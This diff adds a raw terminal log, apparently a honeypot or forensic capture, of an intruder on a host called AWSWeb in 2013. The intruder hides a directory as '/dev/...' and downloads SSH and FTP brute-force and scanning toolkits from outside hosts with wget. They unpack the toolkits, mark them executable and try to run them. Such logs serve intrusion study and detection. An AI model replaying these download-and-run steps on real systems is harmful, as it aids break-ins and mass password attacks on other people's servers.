@@ -1,0 +1,306 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# cd dev
+[4l[4hAWSWeb:/dev# cd ..
+[4l[4hAWSWeb:/# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:/# cd dev
+[4l[4hAWSWeb:/dev# ls
+[4lvcsa6              vcs6               vcsa5              vcs5               
+vcsa4              vcs4               vcsa2              vcs2               
+vcsa3              vcs3               vcsa1              vcs1               
+log                xconsole           loop7              loop6              
+loop5              loop4              loop3              loop2              
+loop1              snd                sndstat            agpgart            
+root               MAKEDEV            net                loop0              
+ppp                shm                pts                core               
+stderr             stdout             stdin              fd                 
+initctl            sda5               sda2               sda1               
+sda                cdrom              disk               hda                
+bsg                fd0                vcsa               vcs                
+ttyS3              ttyS2              ttyS1              ttyS0              
+tty9               tty8               tty7               tty63              
+tty62              tty61              tty60              tty6               
+tty59              tty58              tty57              tty56              
+tty55              tty54              tty53              tty52              
+tty51              tty50              tty5               tty49              
+tty48              tty47              tty46              tty45              
+tty44              tty43              tty42              tty41              
+tty40              tty4               tty39              tty38              
+tty37              tty36              tty35              tty34              
+tty33              tty32              tty31              tty30              
+tty3               tty29              tty28              tty27              
+tty26              tty25              tty24              tty23              
+tty22              tty21              tty20              tty2               
+tty19              tty18              tty17              tty16              
+tty15              tty14              tty13              tty12              
+tty11              tty10              tty1               tty0               
+tty                ptmx               rtc                rtc0               
+snapshot           psaux              network_throughput network_latency    
+hpet               cpu_dma_latency    zero               urandom            
+random             port               mem                kmsg               
+kmem               full               char               input              
+ram9               ram8               ram7               ram6               
+ram5               ram4               ram3               ram2               
+ram15              ram14              ram13              ram12              
+ram11              ram10              ram1               block              
+ram0               null               console            
+[4hAWSWeb:/dev# mkdir ...
+[4l[4hAWSWeb:/dev# cd ...
+[4l[4hAWSWeb:/dev/...# ls
+[4l[4hAWSWeb:/dev/...# wget capra8.t15.org/sc.tar
+[4l--2013-02-22 20:34:13--  http://capra8.t15.org/sc.tar
+Connecting to capra8.t15.org:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2264064 (2M) [application/x-tar]
+Saving to: `sc.tar
+
+ 0% [>                                      ] 10,002       71K/s  eta 31s90% [===================================>   ] 2,056,922    3203K/s  eta 0s100%[======================================>] 2,264,064    3203K/s
+
+2013-02-22 20:34:14 (3203 KB/s) - `sc.tar' saved [2264064/2264064]
+[4hAWSWeb:/dev/...# ls
+[4lsc.tar 
+[4hAWSWeb:/dev/...# tar xvf sc.tar
+[4lmoloz
+moloz/auto
+moloz/autogo
+moloz/autogo1
+moloz/autogo2
+moloz/common
+moloz/crack
+moloz/gen-pass.sh
+moloz/go
+moloz/goeth1
+moloz/goeth2
+moloz/mass
+moloz/pass_file
+moloz/pscan2
+moloz/screen
+moloz/ss
+moloz/ssh-scan
+moloz/start
+moloz/vuln.txt
+[4hAWSWeb:/dev/...# ls
+[4lsc.tar moloz  
+[4hAWSWeb:/dev/...# cd moloz
+[4l[4hAWSWeb:/dev/.../moloz# chmos[1D[1Pd _[1D[1P+x *
+[4l[4hAWSWeb:/dev/.../moloz# ls
+[4lauto        autogo      autogo1     autogo2     common      crack       
+gen-pass.sh go          goeth1      goeth2      mass        pass_file   
+pscan2      screen      ss          ssh-scan    start       vuln.txt    
+[4hAWSWeb:/dev/.../moloz# ./start 66/[1D[1P.66
+[4l=====>Created by PuFoS<=====
+++++++ *Asta e o arhiva privata*  ++++++++
+Exemplu : ./start canal 
+P.S : FARA DIEZ!
+[4hAWSWeb:/dev/.../moloz# cd ..
+[4l[4hAWSWeb:/dev/...# chmos [1D[1P[1D[1Pd _[1D[1P+x *
+[4l[4hAWSWeb:/dev/...# ls
+[4lsc.tar moloz  
+[4hAWSWeb:/dev/...# 
+AWSWeb:/dev/...# 
+AWSWeb:/dev/...# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:/dev/...# 
+AWSWeb:/dev/...# [Kcat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:/dev/...# 
+AWSWeb:/dev/...# ls
+[4lsc.tar moloz  
+[4hAWSWeb:/dev/...# chmos 777 *
+bash: chmos: command not found
+AWSWeb:/dev/...# [Kchmos 777 *[11D[Kchmod 777 *
+[4l[4hAWSWeb:/dev/...# chmod +x *
+[4l[4hAWSWeb:/dev/...# ls
+[4lsc.tar moloz  
+[4hAWSWeb:/dev/...#  wget http://linuxhk.webs.com/xxplex/dedicate.tar
+[4l--2013-02-26 14:58:55--  http://linuxhk.webs.com/xxplex/dedicate.tar
+Connecting to linuxhk.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 42929 (41K) [application/x-tar]
+Saving to: `dedicate.tar
+
+ 9% [===>                                   ] 3,896        45K/s  eta 0s100%[======================================>] 42,929       45K/s
+
+2013-02-26 14:58:55 (45 KB/s) - `dedicate.tar' saved [42929/42929]
+[4hAWSWeb:/dev/...# ls
+[4lsc.tar       moloz        dedicate.tar 
+[4hAWSWeb:/dev/...# tar xvf dedicate.tar
+[4lfb
+fb/users
+fb/200-255
+fb/ftp_scanner.c
+fb/0-100
+fb/pass
+fb/o
+fb/log
+fb/ftp_scanner
+fb/run
+fb/100-200
+[4hAWSWeb:/dev/...# ls
+[4lsc.tar       moloz        dedicate.tar fb           
+[4hAWSWeb:/dev/...# cd fb
+[4l[4hAWSWeb:/dev/.../fb# ls
+[4lusers         200-255       ftp_scanner.c 0-100         pass          
+o             log           ftp_scanner   run           100-200       
+[4hAWSWeb:/dev/.../fb# [Kls[2D[Kcd fb[5D[Kls[2D[Ktar xvf dedicate.tar[20D[Kls[2D[K wget http://linuxhk.webs.com/xxplex/dedicate.tar[49D[Kls[2D[Kchmod +x *
+[4l[4hAWSWeb:/dev/.../fb# [Kchmod +x *[10D[Kls[2D[Kcd fb[5D[Kls[2D[Ktar xvf dedicate.tar[20D[Kls[2D[K wget http://linuxhk.webs.com/xxplex/dedicate.tar[49D[Kls[2D[Kchmod +x *[10D[Kchmod 777 *[11D[Kchmos 777 *[11D[Kls[2D[Kcat /proc/cpuinfo[17D[Kcat /proc/cpuinfo[17D[Kls[2D[Kchmod +x *[10D[Kcd ..[5D[K./start 66.66[13D[Kls[2D[Kchmod +x *[10D[Kcd moloz[8D[Kls[2D[Ktar xvf sc.tar[14D[Kls[2D[Kwget capra8.t15.org/sc.tar[26D[Kls[2D[Kcd ...[6D[Kmkdir ...[9D[Kls[2D[Kcd dev[6D[Kcat /proc/cpuinfo[17D[Kcd ..[5D[Kcat /proc/cpuinfo[17D[Kcd dev[6D[Kls[2D[Kmkdir ...[9D[Kcd ...[6D[Kls[2D[Kwget capra8.t15.org/sc.tar[26D[Kls[2D[Ktar xvf sc.tar[14D[Kls[2D[Kcd moloz[8D[Kchmod +x *[10D[Kls[2D[K./start 66.66[13D[Kcd ..[5D[Kchmod +x *[10D[Kls[2D[Kchmod +x *[10D[Kcd ..[5D[K./start 66.66[13D[Kcd ..[5D[Kchmod +x *[10D[Kls[2D[Kcat /proc/cpuinfo[17D[Kcat /proc/cpuinfo[17D[Kls[2D[Kchmos 777 *
+bash: chmos: command not found
+AWSWeb:/dev/.../fb# ls
+[4lusers         200-255       ftp_scanner.c 0-100         pass          
+o             log           ftp_scanner   run           100-200       
+[4hAWSWeb:/dev/.../fb# ./200-255 66
+[4lunable to open display ":0"
+[4hAWSWeb:/dev/.../fb# 
